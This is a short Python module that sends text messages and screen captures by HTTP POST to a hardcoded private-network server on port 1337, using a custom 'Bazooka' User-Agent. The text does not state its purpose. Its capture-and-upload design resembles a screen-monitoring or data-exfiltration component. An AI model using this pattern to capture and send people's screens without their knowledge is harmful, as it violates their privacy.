import requests

from screenshare import grab_screen

URL = "http://10.251.251.110:1337/message"
PHOTO_URL = "http://10.251.251.110:1337/screenshot"


def send_message(message):
    headers = {'User-Agent': 'Bazooka/0.1'}
    try:
        requests.post(URL, data={"msg": message}, headers=headers, timeout=2)
        with open("log", "a+") as log:
            log.write(message)
            log.write("\n")
    except:
        print("Failed to send message")


def send_message_local(message):
    headers = {'User-Agent': 'Bazooka/0.1'}
    requests.post("http://127.0.0.1:1337/message", data={"msg": message}, headers=headers, timeout=2)


def send_image(image):
    files = {'image': open(image, 'rb')}
    requests.post(PHOTO_URL, files=files)


def send_screengrab(_):
    grab_screen()
    files = {'image': open('/tmp/shit.png', 'rb')}
    try:
        requests.post(PHOTO_URL, files=files)
    except requests.exceptions.ConnectionError as E:
        print("Error: ", E)
